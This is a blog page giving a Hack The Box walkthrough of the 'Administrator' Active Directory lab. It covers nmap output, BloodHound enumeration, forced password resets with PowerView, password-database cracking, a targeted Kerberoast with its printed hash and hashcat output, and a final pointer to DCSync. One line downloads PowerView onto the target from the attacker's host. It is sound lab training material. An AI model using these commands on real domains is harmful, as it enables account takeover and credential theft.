@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="v3l1d">
+<meta name="description" content="Overview At machine&amp;rsquo;s deploying HTB gives us credentials:
+Olivia:ichliebedich Port Scanning The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, administrator.htb (10.10.11.42).
+# Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42 Nmap scan report for administrator.htb (10.10.11.42) Host is up (0.045s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 20:10:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://v3l1d.github.io/posts/administrator/" />
+
+
+    <title>
+        
+            HTB: Administrator :: v3l1d&#39;s Blog  — Cybersecurity Shares
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.0549c5ede15fbb99649f076b79e157863c39a3928246a20e2c44a6a313d1e926.css" integrity="sha256-BUnF7eFfu5lknwdreeFXhjw5o5KCRqIOLESmoxPR6SY=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Administrator">
+<meta itemprop="description" content="Overview At machine&rsquo;s deploying HTB gives us credentials:
+Olivia:ichliebedich Port Scanning The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, administrator.htb (10.10.11.42).
+# Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42 Nmap scan report for administrator.htb (10.10.11.42) Host is up (0.045s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 20:10:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator."><meta itemprop="datePublished" content="2024-11-26T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2024-11-26T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1182"><meta itemprop="image" content="https://v3l1d.github.io/"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://v3l1d.github.io/"/>
+
+<meta name="twitter:title" content="HTB: Administrator"/>
+<meta name="twitter:description" content="Overview At machine&rsquo;s deploying HTB gives us credentials:
+Olivia:ichliebedich Port Scanning The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, administrator.htb (10.10.11.42).
+# Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42 Nmap scan report for administrator.htb (10.10.11.42) Host is up (0.045s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 20:10:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator."/>
+
+
+
+    <meta property="og:title" content="HTB: Administrator" />
+<meta property="og:description" content="Overview At machine&rsquo;s deploying HTB gives us credentials:
+Olivia:ichliebedich Port Scanning The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, administrator.htb (10.10.11.42).
+# Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42 Nmap scan report for administrator.htb (10.10.11.42) Host is up (0.045s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-16 20:10:38Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://v3l1d.github.io/posts/administrator/" /><meta property="og:image" content="https://v3l1d.github.io/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-11-26T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-11-26T00:00:00+00:00" /><meta property="og:site_name" content="v3l1d&#39;s Blog" />
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2024-11-26 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                v3l1d&#39;s blog</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        6 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://v3l1d.github.io/posts/administrator/">HTB: Administrator</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p><img src="attachment/466be2feae5c492da78355532032a443.png" alt=""></p>
+<h3 id="overview">Overview</h3>
+<p><img src="attachment/b41c5c3f674047f7889503967e28a493.png" alt=""></p>
+<p>At machine&rsquo;s deploying HTB gives us credentials:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Olivia:ichliebedich
+</code></pre></div><h3 id="port-scanning">Port Scanning</h3>
+<p>The Nmap scan was initiated to enumerate open ports, services, and potential vulnerabilities on the target system, <code>administrator.htb</code> (10.10.11.42).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">
+<span style="color:#75715e"># Nmap 7.94SVN scan initiated Sat Nov 16 08:09:44 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -A -T4 -o scan 10.10.11.42</span>
+Nmap scan report <span style="color:#66d9ef">for</span> administrator.htb <span style="color:#f92672">(</span>10.10.11.42<span style="color:#f92672">)</span>
+Host is up <span style="color:#f92672">(</span>0.045s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">988</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-11-16 20:10:38Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: administrator.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-11-16T20:10:57
+|_  start_date: N/A
+|_clock-skew: 7h00m45s
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 143/tcp<span style="color:#f92672">)</span>
+HOP RTT      ADDRESS
+<span style="color:#ae81ff">1</span>   43.65 ms 10.10.14.1
+<span style="color:#ae81ff">2</span>   43.87 ms administrator.htb <span style="color:#f92672">(</span>10.10.11.42<span style="color:#f92672">)</span>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</code></pre></div><h3 id="initial-access">Initial Access</h3>
+<p>Try to login into the machine   using olivia credentials and evil-winrm:</p>
+<p><img src="attachment/221a2e0d013131b4982b59e5fdf7de4e.png" alt=""></p>
+<p>Navigate to <strong>C:\Users</strong> and list users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">*Evil-WinRM* PS C:\Users&gt; dir
+Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/22/2024  11<span style="color:#960050;background-color:#1e0010">:</span>46 AM                Administrator
+d-----        10/30/2024   2<span style="color:#960050;background-color:#1e0010">:</span>25 PM                emily
+d-----        11/16/2024  12<span style="color:#960050;background-color:#1e0010">:</span>20 PM                michael
+d-----        11/16/2024  12<span style="color:#960050;background-color:#1e0010">:</span>19 PM                olivia
+d-r---         10/4/2024  10<span style="color:#960050;background-color:#1e0010">:</span>08 AM                Public
+</code></pre></div><p>We can see here all system&rsquo;s users listed. Let&rsquo;s use BloodHound to scan the entire AD environment generating some <strong>.json</strong> files.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator<span style="color:#f92672">]</span>
+└─$ bloodhound-python -c All -u olivia -p <span style="color:#e6db74">&#39;ichliebedich&#39;</span> -d administrator.htb -ns 10.10.11.42
+</code></pre></div><p>These JSON files contain structured data that represent various aspects of the AD environment, including relationships between users, groups, computers, and permissions.</p>
+<p><img src="attachment/4d0ad8097b2459463e290cf3bd3b8f27.png" alt=""></p>
+<h3 id="bloodhound">BloodHound</h3>
+<p>Start neo4j and BloodHound Tool and import the downloaded .json files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">neo4j start
+-----------
+bloodhound
+</code></pre></div><p>Login to neo4j DB with your credentials:</p>
+<p><img src="attachment/c9af39aba289bce86c6552eb547d0b64.png" alt=""></p>
+<p>Then upload all <strong>.json</strong> files generated by BloodHound to visualize the data:</p>
+<p><img src="attachment/670d1cba5df76c9efcf8d2bac65b8f8c.png" alt=""></p>
+<p>I used this blog post : <a href="https://blog.netwrix.com/2022/12/09/bloodhound-active-directory/">BloodHound Active Directory</a> to learn how to use BloodHound for privilege escalation and permissions abuse:</p>
+<p><img src="attachment/ccbb9ccd5a628309c257a35ee8a0cb35.png" alt=""></p>
+<p>After importing the json files i followed the below steps:</p>
+<ol>
+<li>
+<p><strong>Searching for OLIVIA@ADMINISTRATOR</strong>: This indicates that you are looking for a user account named &ldquo;Olivia&rdquo; in the &ldquo;Administrator&rdquo; domain. The format &ldquo;OLIVIA@ADMINISTRATOR&rdquo; suggests that Olivia is part of a domain called &ldquo;ADMINISTRATOR.&rdquo;</p>
+</li>
+<li>
+<p><strong>Going under OUTBOUND OBJECT CONTROL</strong>: This refers to a specific section within BloodHound that shows the permissions a user has to control other objects (like users, groups, or computers) in Active Directory. &ldquo;Outbound&rdquo; typically means the permissions that the user can exert over other objects.</p>
+</li>
+<li>
+<p><strong>Running the query Transitive Object Control</strong>: This means you are executing a query that retrieves all permissions Olivia has on other objects, including those granted through group memberships (transitive permissions).</p>
+</li>
+<li>
+<p><strong>We can see all Olivia&rsquo;s permissions</strong>: This implies that after running the query, you can view all the permissions that Olivia has across the Active Directory environment.</p>
+</li>
+</ol>
+<p><img src="attachment/9d9aefc93a9c3b38d9f6ba68aaa47e79.png" alt=""></p>
+<p>Running this query we can see that Olivia has *<em>Generic ALL</em> permissions on MICHEAL</p>
+<p><img src="attachment/31b09cc4382a9f3f598bca5381a83c78.png" alt=""></p>
+<p>And <strong>MICHEAL</strong> has <strong>ForceChangePassword</strong> on <strong>BENJAMIN</strong></p>
+<p><img src="attachment/33cf4af3bdce46643bedd51b07361b23.png" alt=""></p>
+<h3 id="lateral-movement">Lateral Movement</h3>
+<p>We have to gain access to <strong>MICHAEL@HTB</strong> for first abusing permissions. For this task i served of The tips provided by BloodHound:</p>
+<p><img src="attachment/c102dd39ac29c6c17216c85b52e6081d.png" alt=""></p>
+<p>Login into Olivia using <strong>evil-winrm</strong> and follow the steps below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Step 1: Create a secure string for Olivia&#39;s password</span>
+$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;ichliebedich&#39;</span> -AsPlainText -Force
+
+<span style="color:#75715e"># Step 2: Create the PSCredential object for Olivia</span>
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\Olivia&#39;</span>, $SecPassword)
+
+<span style="color:#75715e"># Step 3: Create a secure string for the new password you want to set for micheal</span>
+$UserPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+
+<span style="color:#75715e"># Step 4: Set micheal&#39;s password using Olivia&#39;s credentials</span>
+Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword -Credential $Cred
+
+</code></pre></div><p><img src="attachment/d86b7be1e9c5f6e3434fce96203f5f90.png" alt=""></p>
+<p><em><strong>WARNING:</strong></em>  to use Set-DomainUserPassword you need to clone <strong>PowerView.ps1</strong> from your attacker machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>livia<span style="color:#ae81ff">\D</span>ocuments&gt; Invoke-WebRequest -Uri http://10.10.14.218:8888/PowerView.ps1 -OutFile <span style="color:#e6db74">&#34;PowerView.ps1&#34;</span>
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\o</span>livia<span style="color:#ae81ff">\D</span>ocuments&gt; Import-Module .<span style="color:#ae81ff">\P</span>owerView.ps1
+</code></pre></div><p>If the command succeded try to login with new michael&rsquo;s credentials in smb:
+<img src="attachment/16841c18836dc0efa7fe27545f4126e7.png" alt=""></p>
+<h3 id="lateral-movement-2">Lateral Movement 2</h3>
+<p>Now we can login into <strong>Michael</strong> trough evil-winrm and the password we&rsquo;ve setted:</p>
+<p><img src="attachment/367227e617adac1473d768edb8ac9be4.png" alt=""></p>
+<p>As previous, follow the steps indicated in BloodHound about the privileges Micheal have on Benjamin:</p>
+<p><img src="attachment/5b991a3dc4dd3f55e444b671391c048c.png" alt=""></p>
+<p>So replicate the commands below on michael&rsquo;s shell trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#Command1</span>
+$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+<span style="color:#75715e">#Command2</span>
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\michael&#39;</span>, $SecPassword)
+<span style="color:#75715e">#Command3</span>
+$UserPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+<span style="color:#75715e">#Command4</span>
+Set-DomainUserPassword -Identity administrator\benjamin -AccountPassword $UserPassword -Credential $Cred
+</code></pre></div><p><img src="attachment/92ddc83830acc9b74104e8edf681a52d.png" alt=""></p>
+<p>With this credentials i tried to login into FTP:</p>
+<p><img src="attachment/781fe399a06064b9247e55ed47a607e4.png" alt=""></p>
+<p>Download this file which is <strong>psafe3</strong> format, use <strong>pswafe2john</strong> to convert into a crackable hash:</p>
+<p><img src="attachment/a650bbccd761200324d72a998993b1fe.png" alt=""></p>
+<p>The output of john for the provided hash is: <strong>tekieromucho</strong>, so open the databse file with PasswordSafe:</p>
+<p><img src="attachment/2a9ea7031b84f67740ffcf1aea86839f.png" alt=""></p>
+<p>Use this password to logiin into <strong>emily</strong> trough evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+</code></pre></div><p><img src="attachment/f0e0022dc751a0343ff1dbcfe2f78609.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">userflag:66e0e43e********
+</code></pre></div><h3 id="privilege-escalation">Privilege escalation</h3>
+<p>Go back in BloodHound and analyze Emily&rsquo;s permissions in the AD environment:</p>
+<p><img src="attachment/4fc6e7885c5d78989dda0ac1e1e10cc9.png" alt=""></p>
+<p>Emily can perform permission abuse on <strong>Ethan</strong> user, trough the process described by BloodHound:</p>
+<h3 id="targeted-kerberoast-attack-steps">Targeted Kerberoast Attack Steps</h3>
+<ol>
+<li>
+<p><strong>Authenticate to the Domain Controller:</strong></p>
+<ul>
+<li>If not running as <code>EMILY@ADMINISTRATOR.HTB</code>, create a PSCredential object:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;asd1234&#39;</span> -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;ADMINISTRATOR.HTB\emily&#39;</span>, $SecPassword)
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Set the Service Principal Name (SPN):</strong></p>
+<ul>
+<li>Use <code>Set-DomainObject</code> to set the SPN:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname=<span style="color:#e6db74">&#39;nonexistent/BLAHBLAH&#39;</span>}
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Retrieve the SPN Ticket:</strong></p>
+<ul>
+<li>Use <code>Get-DomainSPNTicket</code> to get the ticket:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-DomainSPNTicket -Credential $Cred harmj0y | fl
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Crack the Hash:</strong></p>
+<ul>
+<li>The recovered hash can be cracked offline using your preferred tool.</li>
+</ul>
+</li>
+<li>
+<p><strong>Cleanup the Service Principal Name:</strong></p>
+<ul>
+<li>Remove the SPN with <code>Set-DomainObject</code>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname
+</code></pre></div></li>
+</ul>
+</li>
+</ol>
+<p>In alternative this operation is performable in a easier way through <a href="https://github.com/ShutdownRepo/targetedKerberoast">Kerberoast</a>:</p>
+<p><img src="attachment/34aae4c4b58ea4382be0fa09b0b52dcf.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>targetedKerberoast-PLNnu4yz<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Administrator/targetedKerberoast<span style="color:#f92672">]</span>
+└─$ python3 targetedKerberoast.py -d <span style="color:#e6db74">&#39;administrator.htb&#39;</span> -u <span style="color:#e6db74">&#39;emily&#39;</span> -p <span style="color:#e6db74">&#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting kerberoast attacks
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Fetching usernames from Active Directory with LDAP
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printing hash <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>ethan<span style="color:#f92672">)</span>
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$5a4d28a476b4656432ecdb37671cfed3$8e94e930833c4901b8ede4acb176e1e95060d7ee357e7307429e52f71004e6c2cd2c394c9adc2cef16939914ffbe77020879849b20fa99c9c6047bed4d4a2b9fb88f5dce1c28afe2953fd70432f41961fbec3cad41455fdbf6d772c0df91779a7e6135ac1bbb37808403674cade95546ac8e1dbc102ded1e5848c84e77146dc6618b07b14b5d9735d0e7cc45fe177b41d5fd06c7b04f5ee6a064e39323cf1dd673558347506fe6d5eea84ae6cc96b38de82de08cab319fd85f386d1d1d96c813f95c6ae3768b43e918f71336b44e03452b2679b1ca9341b30b62f342a08d7b934e96bdbc24871704e2104da0b24ca6bcaacf284ba635525f51d062e4eba017cb2333634558129070e25c4a169f8cd2e349c4696cce541b5aa0af56ec1ac36f9013b6496b2ae7756f437502450d0eb906ce6e2e960dd014cf19f8f04d69f22069e21e200d0900b4fc56577dbec299a31987ba1a61b6751cfb2a1e32d2439d9f2f075debb1e5b600d8af67a0f9603483c5b6fb9682c8314a4ea63f5cb55dd904c527005adfbc9bc6db2c1f1cd3cc0aeca7731db371e9be45900eb51162337ec218fc3296c88bf6a1f56887103c24bfb33509fa94575f2ce3cffb73ddb4cdc4c9216142f8ee77187cbbe84efab4d8d882e965fed0a21aa3f8060f5f11d547123cb69f8488bb7630bb4ad4652f4bd0f200ad3872c8bca2dbec880470a58e545c8ffb041b7839dc49df10e23a28cea96a9761e39e6f343a1f5e9faf547e10f936e1af4dd82beec0bacddc736959a480cc93cec3ff61dd69a4e80b1f6637ffab82774692c6393000e99e7c84841263a84c842f5e51c725d12dab82a6e836872ad435f762d5c462045fd1c6eeebc150af95d87f87530cc545f4f40f7594d7448e00977ba9a04f9ac6329d2c05b334de574cd56a5988fc53d644870214b98d740d13f8c13eb2972840a7c908d4cea13535ce2787f9ceb9c6201d75125c076e14d4f013fcfdb0d07a0af614770e467eb30d09b97be6a52fedccbc9157eb51dd33fe423376606ac0ab856d439bd24009e97e8f0ac09fff4f62d589106c3f211bd903a9f025b1127ee3eb6325d54551ee4f94ec1294b44a2810cefa7c2360ba0028eb0736edefbaec82f15986974957af0101410f5a33138c6a6cf5bba694b463377470156a5c9cb49daded800a6aa0d61fa60658c8a64cd3ec1d026c3646831818daa426a316eb77b5d8497adc8c09b74989ff45990c77abe605f607617e7431cb593171d68094add4f46b10f70fe4398877e1d581b3d7f5caa305b20b1088aecd3469a5a6439954077e2a7f5169f2508bfdfa9ab7924e85896708c999a4ec06ce2d811fd3b4350bcde0d2c0257bb5889a6c75cf206ab594022e257cf4dc51ccb5b0a33600e7cdae0179f94af1b132d0b4e7f75b9dba6c7dd42203c2f45820061c204d4ac090f9d03b5c975b90
+</code></pre></div><p>From hashcat we retrieved that ethan&rsquo;s password is <strong>limpbizkit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting in autodetect mode  
+  
+Dictionary cache hit:  
+* Filename..: /usr/share/wordlists/rockyou.txt  
+* Passwords.: <span style="color:#ae81ff">14344385</span>  
+* Bytes.....: <span style="color:#ae81ff">139921507</span>  
+* Keyspace..: <span style="color:#ae81ff">14344385</span>  
+  
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$....:limpbizkit  
+                                                            
+Session..........: hashcat  
+Status...........: Cracked  
+Hash.Mode........: <span style="color:#ae81ff">13100</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, TGS-REP<span style="color:#f92672">)</span>  
+Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....b41be3  
+Time.Started.....: Fri Nov <span style="color:#ae81ff">22</span> 23:27:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>  
+Time.Estimated...: Fri Nov <span style="color:#ae81ff">22</span> 23:27:47 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>  
+Kernel.Feature...: Pure Kernel  
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>  
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>  
+Speed.#1.........:   870.9 kH/s <span style="color:#f92672">(</span>1.17ms<span style="color:#f92672">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8  
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>  
+Progress.........: 6144/14344385 <span style="color:#f92672">(</span>0.04%<span style="color:#f92672">)</span>  
+Rejected.........: 0/6144 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>  
+Restore.Point....: 4608/14344385 <span style="color:#f92672">(</span>0.03%<span style="color:#f92672">)</span>  
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
+Candidate.Engine.: Device Generator
+</code></pre></div><p>Go back again on bloodhound and check the status of ethan:</p>
+<p><img src="attachment/b0ac69af57f47809a6ca90acc89f11c5.png" alt=""></p>
+<p><strong>DCSync</strong> permissions is abusable, consult this post <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/credential-dumping/dcsync/dcsync-attack">DCSync Attack</a> , so let&rsquo;s try with <a href="https://wadcoms.github.io/wadcoms/Impacket-SecretsDump/">Impacket-SecretsDump</a> :</p>
